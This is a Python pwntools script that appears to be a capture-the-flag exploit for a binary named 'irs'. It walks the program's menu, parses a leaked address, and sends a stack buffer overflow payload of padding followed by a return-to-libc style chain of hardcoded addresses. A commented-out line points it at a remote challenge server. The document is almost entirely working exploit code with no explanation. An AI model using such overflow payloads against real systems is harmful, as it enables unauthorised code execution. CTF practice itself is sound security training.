#!/usr/bin/env python

from pwn import *
import re

exit = p32(0xf7e199b0)
puts = p32(0x0804afdc)
flag = p32(0x0804c03a)
view = p32(0x0804892c)
main = p32(0x08048a39)

base = p32(0x08040000 + 0xAC2)
offset = p32(0xAC2)

printf = p32(0xf7e34590)

p = tubes.process.process('./irs') 
#p = tubes.remote.remote( 'irs.pwn.republican', 4127 ) 

initial_offset = 33

# '''
print p.recv()

for i in range(5):
	p.sendline("1")
	print p.recv()
	p.sendline("john")
	print p.recv()
	p.sendline("wins")
	print p.recv()
	p.sendline("1")
	print p.recv()
	p.sendline("1")
	print p.recv()


p.sendline("1")
it =  p.recv()
print "="*10
trump = int(re.findall("address: (.*)", it)[0],16)
trump_address = p32(trump)



# 0xff9f1378

# '''
p.sendline("3")
print p.recv()
p.sendline("john")
print p.recv()
p.sendline("wins")
print p.recv()
p.sendline('A'*(initial_offset) + printf + main + base )
print p.recv()
print p.recv()

#'''

p.close()
